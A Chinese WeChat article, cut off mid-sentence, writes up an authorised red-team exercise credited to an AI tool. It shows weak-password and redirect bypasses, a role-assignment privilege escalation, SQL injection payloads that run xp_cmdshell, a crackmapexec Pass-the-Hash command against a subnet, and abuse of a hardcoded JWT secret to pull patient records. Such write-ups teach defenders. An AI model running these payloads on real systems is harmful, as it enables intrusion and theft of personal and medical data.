---
title: 看我如何用ARTEX拿下攻防第一
url: https://mp.weixin.qq.com/s/uY035nzMArL5PGwWZZU76Q
source: Doonsec's feed
date: 2026-11-18
fetch_date: 2026-11-19T09:43:14.570075
---

# 看我如何用ARTEX拿下攻防第一

# 看我如何用ARTEX拿下攻防第一

原创

爱喝酒烫头的曹操
爱喝酒烫头的曹操

墨守安全

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

![封面](https://mmbiz.qpic.cn/mmbiz_jpg/F9ccIXSyq6TF1rmr3EV4cibGXQsgw9e7zM6cRpGN1eo2eY7cnfibweXB4c5V169RNmhTWJunYRRicVdqtHtRPRSAWdUo2vcAEbM1q0akxyUhgE/640?wx_fmt=jpeg&from=appmsg)

前言：前不久参加了省上攻防演练，由于ARTEX加持，打下的目标数量是往年的三四倍，有几个有趣的目标印象比较深刻，这些目标类型丰富，既有门户、小程序，也有对象存储和监控台，重新捋一遍，作为案例总结，供学习复盘。

提示：为保护敏感信息，本文已作脱敏处理；文中配图由 AI 生成，仅作示意，请勿对号入座。内容侧重实战思路，仅供交流探讨。

表 1 · 目标清单

| 目标 | 初始突破点 | 核心风险 |
| --- | --- | --- |
| A | 独立登录入口与弱口令 | 跨系统权限复用、个人信息泄露 |
| B | 前端跳转与默认口令 | 数据库暴露 |
| C | 角色赋值越权 | 管理员权限、连接串泄露 |
| D | 备份包、未授权接口 | 主机失陷、内网横向、数据泄露 |
| E | 客户端硬编码密钥 | 患者信息越权访问 |
| F | JS 测试 URL 与弱口令 | 对象存储失陷 |
| G | 初始化接口暴露凭证 | 批量存储凭证泄露 |
| H | Druid 监控台弱口令 | 主机失陷、内网扩展 |

PART · 01

一、认证类漏洞

目标A：统一认证双因子绕过？

A.1

信息收集

目标 A 最后能打穿，多少有点出乎我的意料。

刚拿到它时，我甚至有些泄气。这类单位经过多年的攻防演练，能从互联网上直接撕开的口子已经不多了；即使偶尔找到入口，也大多只是边缘系统，很难拿到多少分。

信息收集做了几轮，最后只找到官网、一套统一认证，以及挂在统一认证后面的几个业务系统。搜索引擎还能翻出更多系统，但点进去无一例外都会跳到统一认证，登录时既要密码，也要手机验证码。我随手试了几次，访问很快就被限制，于是准备先放一放。

A.2

异常发现

第二天中午，我让 ARTEX帮忙过了一遍，发现一个此前没太注意的业务系统 JS有点不一样：页面会先加载完整资源，最后才跳转到统一认证。

A.3

弱口令突破

顺着 JS 里的调用逻辑，我们还原出了它自己的登录请求格式。我拿已有口令跑了一轮，居然撞中了一组弱口令。

POST /<biz>/api/login HTTP/1.1

Host: app.example

Content-Type: application/json

{"account":"<account>","password":"<weak-password>"}

当时只顾着继续往下走，后来复盘才想明白：双因子并没有被绕过，它确实在统一认证的入口；但问题在于，这个业务系统还保留着自己的登录页和密码校验，只是在前端做了跳转。

A.4

找到真实登录口

于是我在 Burp 里丢掉跳转包，再用浏览器开发者工具删掉盖在页面上的全屏动画。遮罩消失后，原来的登录页露了出来。输入账号和密码，主页慢慢加载完成，眼前竟然是目标 A 的数据中台。

数据中台本身已经足够重要，更麻烦的是，其中的管理员账号还能直接跳转到其他业务系统，相当于拿到了一个带管理员权限的统一认证身份。我逐个打开这些系统，发现其中几套可以直接导出个人信息，姓名、身份证号、手机号和住址都在，数据量极大，算了一下，光数据分就已经差不多了，于是整理证据、提交报告，这条线也就到此为止。

![案例过程截图](https://mmbiz.qpic.cn/mmbiz_jpg/F9ccIXSyq6RmHwNzkkB4jgBxJXw4Ta7r7PibSqXD47iaplj15Ju0LiacvAdrfZlhmX13iaQ1nm8cibjJVcQK5VLLKdcZ9nmAf5zs75Z4aZG9pzm8/640?wx_fmt=jpeg&from=appmsg)

目标B：数据库泄露

B.1

同套路入口

有了目标 A 的经验，目标 B 就顺手多了。它用的是相似的业务系统，也会先跳转到统一认证。我照着之前的方法丢掉跳转包、删掉页面遮罩，原来的登录界面很快就露了出来。随后试了一组默认口令，成功进了后台。

B.2

数据库地址泄露

后台里没有太多可以直接利用的内容，不过从指纹可以确认它用的是 BladeX。继续查看数据源接口时，我发现了一套直接暴露在公网的数据库地址，便用 DBX 连了上去。库里没有找到适合继续利用的点，但数据量有几十万条，已经足够拿分数。提交结果后，我们结束了这条线。

![案例过程截图](https://mmbiz.qpic.cn/sz_mmbiz_jpg/F9ccIXSyq6RV0CO0LmdeWwHhyvUzkcxK1yficmsEzGuyVribokYFQEEKMYgJe3p1brzvHIWf3DG1wc59kXIkkIKfYtaAlDhzx5Op7B0hEBHMI/640?wx_fmt=jpeg&from=appmsg)

目标C：认证越权

目标 C 是后来回头补上的。

最初只拿到一个普通用户的弱口令，当时时间紧，简单翻了一遍，没看到特别有价值的内容，很快就把它放到了一边。重新检查时才发现，入口其实一直摆在眼前：普通用户虽然只能编辑用户信息，但服务端在处理角色赋值时没有做白名单校验。

POST /api/<module>/user/<action> HTTP/1.1

Cookie: <low-priv-session>

Content-Type: application/json

{"user":{"id":"<self>"},"assignedRoleNames":["Admin","User"]}

C.1

普通用户升级

我用普通账号的 Cookie 发出请求，把自己的角色改成 Admin，接口直接返回 success。

POST /api/services/app/user/CreateOrUpdateUser HTTP/1.1

Host: supplier.example

Cookie: .AspNet.ApplicationCookie=<low-priv-session>

Content-Type: application/json

{"user":{"id":<self>,"name":"probe"},"assignedRoleNames":["Admin","User"]}

----------

HTTP/1.1 200 OK

Content-Type: application/json

{"result":null,"success":true,"error":null}

重新登录后，权限项从 122 个增加到 234 个。看到这个数字时，我一度怀疑是不是哪里看错了。

管理员权限到手后，后面就简单多了。

C.2

漏洞利用

报表管理功能中有一个获取连接串的接口，只要传入空对象，就会返回一段 base64；解码后，里面是一条 sa 连接串。

POST /api/services/app/reportManager/GetConnectionString HTTP/1.1

Host: supplier.example

Cookie: .AspNet.ApplicationCookie=<admin-session>

Content-Type: application/json

{}

-----------

HTTP/1.1 200 OK

Content-Type: application/json

{"result":"<base64>"}

Base64解码：

Server=db.internal;Database=<db\_name>;User ID=sa;Password=<masked>

接着又在报表参数中发现注入点。组件虽然做了校验，但逻辑很简单：先按分号切分，再要求每一段都以 SELECT 开头。通过换行就能绕过这层限制，后面接上 EXEC xp\_cmdshell，whoami 返回的是 nt authority\network service。

报表参数注入执行命令

GET /Report/Viewer/Index?reportName=<report\_name>&param1=x'%20;%20SELECT%201%0AEXEC%20xp\_cmdshell%20'cmd%20/c%20whoami'-- HTTP/1.1

Host: supplier.example

Cookie: .AspNet.ApplicationCookie=<admin-session>

----------

HTTP/1.1 200 OK

...

nt authority\network service

这条链里没有什么新技术，无非是越权、连接串泄露和命令执行。

真正耽误时间的，是我第一次拿到普通账号时，太快认定它没有价值。

![案例过程截图](https://mmbiz.qpic.cn/sz_mmbiz_jpg/F9ccIXSyq6QMWfHNNOTt24IAgzmu92Yhln2REO9ujIO3IAlmqh4UCS9pic0MHLvsV77qD3x0a42mkhEXibJOkw4MgcB0U2icM3T90p8crWtb0E/640?wx_fmt=jpeg&from=appmsg)

PART · 02

二、备份类漏洞

目标 D 是我们投入时间最多的一个，前后从两个入口摸了进去。

目标D入口一：通过被修复的旧漏洞找到备份

攻击链

备份包泄露 → 源码审计 → 未授权报表 SQL 注入（sa） → xp\_cmdshell 命令执行 → Godzilla + EfsPotato→SYSTEM → PtH 横扫 192.168.26.0/24 → 获取数据库信息 + 备份 + 通话录音

这类目标通常不算难打：系统多、外包多，补丁估计也不完善，所以一开始我们都觉得，找到入口只是时间问题。真正上手后才发现并没有那么顺。资产测绘做完，只发现一台 IIS 站点；目录、端口和常见路径全扫了一遍，也没啥收获。

D.1

AI的信息收集

通过一些其他方法确定系统指纹后，我让 AI 帮忙梳理它过去公开或半公开的漏洞。

![案例过程截图](https://mmbiz.qpic.cn/mmbiz_jpg/F9ccIXSyq6Tibsro5wPj5H3WibgEqhF0HPiadUDXe1ictBjEk3Hv8GzjoYq63FqbNUUbNTGXsiaH3xzhVyiazRAvj9v5xicYibsia6asX39FHQnZHB8I/640?wx_fmt=jpeg&from=appmsg)

D.2

备份文件猜测

当我兴奋的使用这个poc进行验证的时候，发现行不通，该接口已被删除。着急之余我立刻转变思路，猜想系统缩写构造字典，然后对系统重新进行目前扫描，这次惊喜的发现成功获取到了系统的备份文件，可以全量下载：一个完整的站点备份包就放在 Web 根目录下，没有任何鉴权，体积一百三十多兆。我随即把整个压缩包下载了下来。（site为站点缩写）

GET /backup/<site>.zip HTTP/1.1

Host: portal.example

----------

HTTP/1.1 200 OK

Content-Type: application/zip

Content-Length: <size>

D.3

获取源码

拿到源码，直接审计，压缩包里有几万个文件，原本还想着逐个查找，真正解开后才发现根本不用费这个劲：数据库连接串、后台超级管理员账号、写死的 DES 密钥，以及一整份内网资产清单，全都留在配置文件和代码注释里。接下来只需要耐心往下审。

D.4

漏洞利用

顺着报表模块看，很快就找到了直接拼接 SQL 的位置，参数没有经过有效过滤。我先用数据库版本做了验证，页面返回 500，报错里把版本号原样带了出来；再确认当前数据库账号，果然是 sa。

报表参数报错注入

GET /report/<endpoint>.aspx?code=report.rdlc&ActionId=1&OrgID=convert(int,@@version) HTTP/1.1

Host: portal.example

----------

HTTP/1.1 500 Internal Server Error

...

将 nvarchar 值 'Microsoft SQL Server 20XX' 转换成数据类型 int 时失败。

报错回显确认当前账号为 sa；再用 is\_srvrolemember('sysadmin') 确认 sysadmin 权限。

有了这个权限，后面的过程就简单多了：通过堆叠查询调用 xp\_cmdshell，whoami 返回 nt authority\system，说明数据库服务本身就以 SYSTEM 运行，连提权都省了。Web 端另外上传了一个内存马，主要是为了方便后续操作。

堆叠查询调用 xp\_cmdshell

GET /report/<endpoint>.aspx?code=report.rdlc&ActionId=1&OrgID=0;DECLARE%20@t%20TABLE(o%20NVARCHAR(4000));INSERT%20@t%20EXEC%20master..xp\_cmdshell%20'whoami';RAISERROR(@o,16,1)-- HTTP/1.1

Host: portal.example

----------

HTTP/1.1 500 Internal Server Error

...

System.Data.SqlClient.SqlException: nt authority\system

D.5

横向渗透

真正让人兴奋的是横向过程。以这台 SYSTEM 主机为跳板，我们搭好隧道，再用拿到的本地管理员哈希对一个内网 C 段做 Pass-the-Hash，最终发现 17 台主机的管理共享都可以读写。

以 SYSTEM 跳板经 suo5 隧道，用全域本地管理员 xxadmin 的 NTLM 哈希做 SMB Pass-the-Hash

抓取hash，约 17 台主机管理共享可读写。

xxadmin : xx密码 NTLM=exxxxxxxxx

crackmapexec smb 192.168.26.0/24 -u user -H exxxxxx

=> [+] 17 hosts Pwn3d! (C$ / ADMIN$ readable)

![案例过程截图](https://mmbiz.qpic.cn/sz_mmbiz_jpg/F9ccIXSyq6QQ2df3x6DibldNwYKibIiawZLDSYD6AUWCkBibBZhO4l5x6qwLTeQSY820L6Y5thTkayXEapLIhYicYzN643ZV97fx4jATbquibvUD8/640?wx_fmt=jpeg&from=appmsg)

后来才弄清楚，这批机器来自同一套镜像，本地管理员口令完全相同；运维后台又使用固定密钥加密口令，拿到数据后可以离线还原。一个入口就这样扩展到了整张内网。最后带出的内容包括业务库备份、全量通话录音、数百名员工的明文口令，以及后台超级管理员会话，收获比最初预想的多得多。

目标D入口二：另一个门户

同一家单位还有另一个门户，是后来顺手发现的。从指纹看，它使用 PublicCMS，运行在 Spring Boot 上。我先试了几个接口，版本号和服务器部署目录都直接返回，没有做任何隐藏；继续往下看，又发现接口清单同样不需要凭证。清单里有一个模板渲染接口，往模板参数中放入 FreeMarker 表达式后，WAF 会拦截 ${，但旧式插值可以绕过，随后便读到了类路径下的文件。

不过，真正拿到分数的不是文件读取，而是两个未授权的列表接口。我分页拉取了反馈列表和在线咨询列表。前者有三百多条记录，手机号、邮箱、姓名和反馈正文都是明文，去重后仍有两百多个手机号和两百多个邮箱；后者有二十多条，年龄、性别、病情描述和受理单号都在，手机号只做了部分脱敏。

我们还尝试比较两个登录接口的验证码校验，并枚举出几个账号测试弱口令，但返回结果都是“用户已被禁用”，最终没有拿到后台会话或 webshell。这条线只拿到了数据分，谈不上完整接管，不过目标暴露的数据范围已经很清楚了。

![案例过程截图](https://mmbiz.qpic.cn/sz_mmbiz_jpg/F9ccIXSyq6Qz6ia760MMlYqDAtW3b2KGXCB9gb3kOnHNOyFpLYAeo6gxyKkicEpDyD4QX41FxC8FNv5oRBrCHbqn71KJrmIsSxfPXr29mJcOA/640?wx_fmt=jpeg&from=appmsg)

PART · 03

三、客户端和存储桶类

目标E：JWT

目标 E 的入口是一款微信小程序。问题并不在服务端，而在客户端：小程序安装包把加密和鉴权所需的关键材料一起交了出来。反编译之后，请求逻辑几乎一眼就能看明白。请求体使用 SM4 加密，签名由 MD5 和时间戳组成，Authorization 则是一个 HS256 的 JWT。可 SM4 密钥、JWT secret 和签名算法全都硬编码在客户端，服务端没有参与密钥分发。

示意:

SM4 key=<hardcoded-key>

JWT secret=<hardcoded-secret>

sign=MD5(canonical+timestamp)

POST /<mini>/api/<biz>/<query> HTTP/1.1

Authorization: Bearer <self-signed JWT>

我按照客户端的逻辑自行构造请求，发到患者查询接口。第一次返回“系统中未找到对应信息”，换一个参数后又返回“患者信息传入有误”。这两条提示本身说明不了太多，但至少证明请求已经进入业务逻辑。随后换成一个真实存在的身份证号，接口返回了姓名、身份证号、手机号、地址、余额和完整住院信息。也就是说，只要知道某个身份证号，就能查询对应患者的就诊信息。问题不在加密或签名，而在服务端只检查 token 是否有效，却没有核对 token 属于谁、它又有权查询谁。

这个案例并不复杂，却很有代表性。很多单位把 WAF、堡垒机和防护策略都堆在 Web 入口，小程序后端得到的关注却少得多。在攻防演练...